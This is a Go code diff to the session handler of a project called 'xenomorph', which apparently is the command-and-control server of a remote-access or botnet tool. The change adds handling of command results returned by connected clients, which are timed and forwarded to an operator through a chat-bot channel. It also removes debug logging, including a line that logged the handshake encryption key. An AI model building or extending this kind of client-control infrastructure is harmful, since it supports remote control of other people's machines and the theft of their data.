@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net"
+	"time"
 
 	"github.com/codevault-llc/xenomorph/internal/bot"
 	"github.com/codevault-llc/xenomorph/internal/bot/embeds"
@@ -41,7 +42,6 @@ func (s *Session) Handle() error {
     s.registry.Unregister(s.ID)
     s.Conn.Close()
 
-		// Handle it safely
 		if r := recover(); r != nil {
 			logger.L().Error("Session handling panic", zap.Any("recover", r), zap.String("id", s.ID), zap.String("addr", s.Addr))
 		}
@@ -78,7 +78,7 @@ func (s *Session) Handle() error {
 				s.Send(types.MsgAck, 0, msgID, []byte("ACK"))
 				continue
 			}
-			logger.L().Info("New client registered", zap.String("uuid", s.ID), zap.String("address", s.Addr))
+
 			key, err := s.Sec.GenerateKey()
 			if err != nil {
 				return err
@@ -91,9 +91,6 @@ func (s *Session) Handle() error {
 				return err
 			}
 
-			logger.L().Info("Sending handshake payload", zap.String("uuid", s.ID), zap.String("address", s.Addr))
-			logger.L().Debug("Generated key for handshake", zap.ByteString("key", key))
-
 			handshakePayload := types.HandshakePayload{
 				Encryption: "aes-gcm",
 				Key: key,
@@ -104,8 +101,6 @@ func (s *Session) Handle() error {
 				logger.L().Error("Failed to marshal handshake payload", zap.Error(err))
 				return err
 			}
-
-			logger.L().Debug("Sending handshake message", zap.ByteString("handshakeData", handshakeData), zap.Uint32("msgID", msgID))
 
 			if err := s.Send(types.MsgHandshake, 0, msgID, handshakeData); err != nil {
 				logger.L().Error("Failed to send handshake message", zap.Error(err))
@@ -138,8 +133,32 @@ func (s *Session) Handle() error {
 			logger.L().Debug("Received ping")
 			s.Send(types.MsgAck, 0, msgID, []byte("PONG"))
 
-		case types.MsgCommand:
-			logger.L().Debug("Command received (not handled yet)")
+		case types.MsgCommandResponse:
+			if len(payload) == 0 {
+				logger.L().Error("Received empty payload for MsgCommandResponse", zap.String("address", s.Addr))
+				continue
+			}
+
+			var response types.CommandResponse
+			if err := json.Unmarshal(payload, &response); err != nil {
+				logger.L().Error("Failed to unmarshal command response", zap.Error(err), zap.ByteString("payload", payload))
+				return err
+			}
+
+			registryCommand, err := s.registry.GetCommand(response.ID)
+			if err != nil {
+				logger.L().Error("Failed to get command from registry", zap.Error(err), zap.String("commandID", response.ID))
+				return err
+			}
+
+			currentTime := time.Now()
+			previousTimestamp := registryCommand.Timestamp
+
+			previousTime := time.Unix(0, previousTimestamp)
+			duration := currentTime.Sub(previousTime)
+
+			channel := bot.GetBot().GetChannelFromUser(s.ID, "info")
+			bot.GetBot().SendEmbedToChannel(channel, "", embeds.CommandResponseEmbed(&response, duration))
 
 		default:
 			logger.L().Warn("Unknown message type", zap.Uint8("type", msgType))
@@ -153,23 +172,16 @@ func (s *Session) Read() (byte, byte, uint32, []byte, error) {
 		return 0, 0, 0, nil, err
 	}
 
-	logger.L().Debug("Received header", zap.ByteString("header", header))
-	fmt.Println("Received header:", header)
-
 	totalLen := binary.BigEndian.Uint32(header[0:])
 	msgType := header[4]
 	flags := header[5]
 	msgID := binary.BigEndian.Uint32(header[6:])
-
-	logger.L().Debug("Parsed header", zap.Uint32("totalLen", totalLen), zap.Uint8("msgType", msgType), zap.Uint8("flags", flags), zap.Uint32("msgID", msgID))
 
 	payload := make([]byte, totalLen-10)
 	if _, err := s.Conn.Read(payload); err != nil {
 		logger.L().Error("Failed to read payload", zap.Error(err), zap.Uint32("msgID", msgID))
 		return 0, 0, 0, nil, err
 	}
-
-	logger.L().Debug("Received payload", zap.ByteString("payload", payload), zap.Uint32("msgID", msgID))
 
 	if flags&0x1 != 0 {
 		decompressed, err := utils.Decompress(payload)
@@ -219,4 +231,12 @@ func (s *Session) Send(msgType byte, flags byte, msgID uint32, payload []byte) e
 	}
 
 	return nil
+}
+
+func (s *Session) GetSessionId() string {
+	if s == nil {
+		return ""
+	}
+
+	return s.ID
 }
